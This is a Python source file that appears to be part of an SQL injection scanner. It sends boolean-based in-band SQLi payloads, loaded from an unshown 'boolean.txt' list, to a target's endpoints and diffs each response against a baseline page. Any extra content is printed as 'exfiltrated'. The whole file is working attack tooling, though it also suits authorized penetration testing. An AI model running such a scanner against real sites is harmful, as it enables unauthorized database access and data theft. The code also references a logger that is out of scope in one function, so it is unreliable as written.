from bs4 import BeautifulSoup
import difflib
import requests

from utils.auxiliary import *
from utils.files import *
import utils.auxiliary


def find_diff(init_r, r):
    different = False
    if not hasattr(init_r, 'text') or not hasattr(r, 'text'):
        raise ValueError("Requests must have text attribute")
    soup_1 = BeautifulSoup(init_r.text, 'html.parser')
    soup_2 = BeautifulSoup(r.text, 'html.parser')
    html_1 = soup_1.prettify()
    html_2 = soup_2.prettify()
    # Taking the difference between our html
    diff = difflib.ndiff(html_1.splitlines(), html_2.splitlines())
    # We are looking whether the length of content is more
    if len(r.text) > len(init_r.text):
        different = True
        log.logger.info(
            f"{GREEN}[+]{RESET} New page "
            f"size is {len(r.text)} instead "
            f"of default {len(init_r.text)}")
    if utils.auxiliary.verbose and different:
        log.logger.info(f"{GREEN}[+]{RESET} New content "
                        f"exfiltrated >>> >>> >>>")
    # Printing every line that is not found in first html
    for line in diff:
        if line.startswith('+') and len(r.text) > len(init_r.text):
            print(line[1:])
    if utils.auxiliary.verbose and different:
        print("<<< <<< <<<")
    return different


def try_boolean_sqli(url, options: list):
    log = Auxiliary(__name__)
    log.set_config()
    vuln_endpoints, db_comment = options[0], options[1]
    init_r = requests.get(url=url)
    payloads = File("boolean.txt")
    for endp in vuln_endpoints:
        for pld in payloads.file:
            # URL encoding our payload. [:-1] to get rid of \n
            pld = requests.utils.quote(pld[:-1] + db_comment)
            r = requests.get(url=url + endp + pld)
            log.logger.info(
                f"{BLUE}[*]{RESET} Trying boolean in-band SQLi "
                f"on endpoint {url + endp + pld}")
            if r.status_code == 200:
                # Looking for difference between pages
                if find_diff(init_r, r):
                    log.logger.info(
                        f"{GREEN}[+]{RESET} Confirmed boolean in-band SQLi "
                        f"on endpoint {url + endp + pld}")
